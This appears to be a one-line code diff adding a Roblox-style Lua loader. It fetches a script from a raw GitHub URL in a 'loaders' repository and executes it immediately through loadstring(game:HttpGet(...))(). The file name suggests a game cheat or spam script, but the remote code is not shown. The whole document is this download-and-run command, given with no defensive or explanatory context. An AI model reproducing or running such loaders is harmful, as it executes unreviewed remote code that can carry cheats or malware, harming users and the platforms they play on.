@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/electricity-bricklayer-spam3-g45lgtl2hbvfu2.lua"))()
